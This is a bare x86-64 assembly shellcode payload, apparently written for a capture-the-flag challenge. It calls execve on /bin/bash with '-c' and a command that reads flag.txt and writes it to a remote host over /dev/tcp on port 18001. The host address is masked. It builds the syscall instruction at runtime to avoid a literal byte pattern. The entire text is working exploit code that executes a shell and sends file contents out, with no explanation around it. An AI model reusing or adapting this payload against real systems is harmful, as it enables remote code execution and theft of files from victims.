  call 14
  db '/bin/bash', 0
  pop rdi
  call 7
  db '-c', 0
  pop rax
  call 44 + 5
  db '/bin/cat flag.txt > /dev/tcp/XXXXXXXXX/18001', 0
  pop rbx
  call 4
  pop rcx
  mov dx, 0x050f
  xor edx, edx
  push rdx
  push rbx
  push rax
  push rdi
  mov rsi, rsp
  mov rax, 59
  add rcx, 3
  jmp rcx
